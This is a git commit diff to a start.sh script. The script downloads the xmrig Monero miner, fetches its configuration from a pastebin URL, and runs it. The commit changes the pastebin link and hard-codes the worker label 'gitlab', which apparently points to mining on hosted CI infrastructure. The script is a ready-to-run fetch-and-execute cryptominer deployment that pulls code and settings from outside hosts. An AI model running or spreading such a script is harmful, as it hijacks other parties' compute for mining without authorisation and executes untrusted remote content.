3a7dc5690beef37df672a35266367a176e3cd38c
salmo007 <83998996+salmo007@users.noreply.github.com>
2021-05-12 15:10:30 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,8 +1,9 @@
 #!/bin/sh
 curl -L -o xmrig.tar.gz https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
 tar xvfz xmrig.tar.gz
-curl -L -o config.json https://pastebin.com/raw/ehYaaKBw
-PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+curl -L -o config.json https://pastebin.com/raw/8F0nq1TL
+# PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+PASS="gitlab"
 LOCATION=`pwd`
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $LOCATION/config.json
 ./xmrig --config=config.json
